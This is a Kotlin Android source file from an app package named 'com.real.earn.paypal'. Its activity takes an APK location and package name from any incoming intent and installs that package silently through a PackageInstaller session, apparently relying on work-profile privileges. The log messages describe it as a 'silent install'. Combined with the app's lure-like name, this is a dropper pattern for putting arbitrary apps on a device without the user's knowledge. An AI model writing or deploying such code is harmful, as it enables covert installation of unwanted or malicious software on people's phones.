package com.real.earn.paypal

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

class WorkProfileInstallerActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val apkUriString = intent.getStringExtra("apk_uri")
        val packageName = intent.getStringExtra("package_name")

        if (apkUriString != null && packageName != null) {
            Log.d("WorkProfileInstaller", "Received APK URI: $apkUriString for package: $packageName")
            installApkSilently(Uri.parse(apkUriString), packageName)
        }
        
        // کام ختم، ایکٹیویٹی بند کریں
        finish()
    }

    private fun installApkSilently(apkUri: Uri, packageName: String) {
        try {
            val packageInstaller = packageManager.packageInstaller
            
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            ).apply {
                setAppPackageName(packageName)
            }

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            contentResolver.openInputStream(apkUri)?.use { inputStream ->
                session.openWrite("apk_stream", 0, -1).use { outputStream ->
                    inputStream.copyTo(outputStream)
                    session.fsync(outputStream)
                }
            }

            // 🟢 FIX: PendingIntent import
            val pendingIntent = PendingIntent.getBroadcast(
                this,
                sessionId,
                Intent("com.real.earn.paypal.APK_INSTALL_STATUS"),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            
            session.commit(pendingIntent.intentSender)
            Log.d("WorkProfileInstaller", "Session committed for $packageName")

        } catch (e: Exception) {
            Log.e("WorkProfileInstaller", "Silent install failed: ${e.message}", e)
        }
    }
}
